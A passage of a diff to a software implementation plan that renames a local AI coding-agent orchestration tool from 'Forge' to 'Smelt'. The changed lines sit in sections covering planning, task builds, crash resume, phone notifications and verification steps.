 **Files:** `src/store/schema.ts` (runs migration), `src/engine/run.ts`, `src/engine/roles.ts`, `src/api/routes.ts`, `web/src/screens/new-run.tsx`, `web/src/screens/run.tsx`, `test/engine/plan.test.ts`, `test/live/plan.live.test.ts`, `e2e/plan.e2e.ts`.
-**Approach:** The planner runs read-only in its own detached worktree (KTD5) and is told to produce independent tasks. Forge validates the returned list; an invalid plan goes back to the planner once and is then shown to the owner as an error. The new-run screen carries the pre-approved command list from U9 for the owner to confirm (R20). The run screen offers edit, add, delete, Approve, Request changes with feedback, and Cancel.
+**Approach:** The planner runs read-only in its own detached worktree (KTD5) and is told to produce independent tasks. Smelt validates the returned list; an invalid plan goes back to the planner once and is then shown to the owner as an error. The new-run screen carries the pre-approved command list from U9 for the owner to confirm (R20). The run screen offers edit, add, delete, Approve, Request changes with feedback, and Cancel.
 **Test scenarios:**
 - Live: a prompt against a temporary repository returns a valid task list with acceptance criteria, and the source checkout is unchanged.
 - Live: a planner edit attempt is refused.
@@ -466,7 +465,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 **Test scenarios:**
 - Covers AE1. Deleting one of three planned tasks and approving creates exactly two task worktrees.
 - A failing setup command is reported with its output before any agent turn starts.
-- Live: a two-task run builds the first task fully before starting the second, and each ends with Forge's commit.
+- Live: a two-task run builds the first task fully before starting the second, and each ends with Smelt's commit.
 - Cancelling a run stops the active turn and leaves finished tasks' branches in place.
 - Covers AE8. Live: a two-task run whose agents use only pre-approved commands and worktree edits reaches the end of build with no approval answered.
 **Verification:** A real two-task run builds on the owner's machine.
@@ -508,10 +507,10 @@ Every unit follows the same execution rule: write the listed tests first and wat
 **Approach:** Implement the rest of KTD9.
 **Test scenarios:**
 - A finished task is not rebuilt after a restart, and a run awaiting plan approval is still awaiting it.
-- Live: Forge is killed during a build turn; on start the task is re-driven from its resume cursor and finishes.
+- Live: Smelt is killed during a build turn; on start the task is re-driven from its resume cursor and finishes.
 - A second interruption marks the task interrupted.
 - End to end: the run screen shows the interrupted task with Resume, and Resume re-drives it.
-**Verification:** The owner kills Forge during a real run and it completes after start.
+**Verification:** The owner kills Smelt during a real run and it completes after start.
 
 ### U16. Runs board
 
@@ -614,7 +613,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 
 ### U23. Phone app: install and notifications
 
-**Goal:** Forge lives on the owner's home screen and tells them when it needs them.
+**Goal:** Smelt lives on the owner's home screen and tells them when it needs them.
 **Requirements:** R23, R24.
 **Dependencies:** U7, U2, U14, U16.
 **Files:** `web/public/manifest.webmanifest`, `web/src/sw.ts`, `web/src/app/notifications.tsx`, `src/push.ts`, `src/store/schema.ts` (push subscriptions migration), `web/src/screens/settings.tsx`, `src/api/routes.ts`, `test/push.test.ts`, `e2e/install.e2e.ts`.
@@ -626,7 +625,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 - A task reaching awaiting decision sends one push message per subscribed device, under the same payload limit.
 - A subscription the push service reports as expired is removed.
 - End to end: activating a notification opens the pending approval card.
-**Verification:** Covers AE11. The owner installs Forge on their iPhone, receives a notification for a real approval, and answers it from the notification.
+**Verification:** Covers AE11. The owner installs Smelt on their iPhone, receives a notification for a real approval, and answers it from the notification.
 
 ### U24. First-run path and README
 
@@ -636,7 +635,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 **Files:** `README.md`, `web/src/screens/settings.tsx`, `e2e/first-run.e2e.ts`.
 **Approach:** The README leads with the headline and tagline, then install, first run, roles, commands, phone access, and a plain section on what stays local and what each vendor CLI sends to its provider.
 **Test scenarios:**
-- End to end: on a fresh data directory with one signed-in CLI, starting Forge and following the first-run screen reaches a started run with no manual file editing.
+- End to end: on a fresh data directory with one signed-in CLI, starting Smelt and following the first-run screen reaches a started run with no manual file editing.
 **Verification:** The owner times a first run from a fresh clone on a second machine or user account.
 
 ---
@@ -648,7 +647,7 @@ Every unit follows the same execution rule: write the listed tests first and wat
 | Types | `npm run typecheck` | every unit |
 | Tests | `npm test` | every unit |
 | Live tests | `npm run test:live`, on the owner's machine with the CLIs signed in | U3, U6 to U9, U11, U12, U15, U17 to U21 |
-| End to end | `npm run e2e`, a real browser against a real Forge process | every unit with a file under `web/` |
+| End to end | `npm run e2e`, a real browser against a real Smelt process | every unit with a file under `web/` |
 | Client build | `npm run build --prefix web` | every unit with a file under `web/` |
 | No fakes | A search of `src/`, `web/` and `test/` finds no mock library, no fake CLI and no demo data | every unit |
 | Owner check | The unit's Verification line, done by the owner on real work | every unit |
